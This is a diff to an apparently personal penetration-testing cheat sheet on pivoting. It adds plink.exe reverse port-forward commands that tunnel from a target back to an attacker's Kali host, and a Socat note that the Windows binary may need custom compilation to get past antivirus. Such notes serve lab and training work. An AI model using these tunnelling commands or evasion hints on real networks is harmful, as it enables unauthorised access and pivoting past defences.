@@ -590,5 +590,27 @@ ssh -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -fN
 ssh -R 2222:17.16.0.100:22 kali@17.16.0.200 -i id_rsa -fN
 ```
  
-Reverse Forwarding -R
+Reverse Forwarding`-R`
+
+
+### Windows (Plink.exe) | Puttygen
+
+```
+cmd.exe /c echo y | .\plink.exe -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -N
+```
+
+```
+cmd.exe /c echo y | .\plink.exe -R 8000:172.16.0.10:80 kali@172.16.0.20 -i KEYFILE -N
+```
+
+`cmd.exe /c echo y` at the start is for non-interactive shells
+
+
+
+### Socat | Fully Stable Linux Shell
+
+- Superb for Port Forwarding
+- rarely installed by default on a target
+- Windows version is unlikely to bypass Antivirus software by default, so custom compilation may be required
+
 
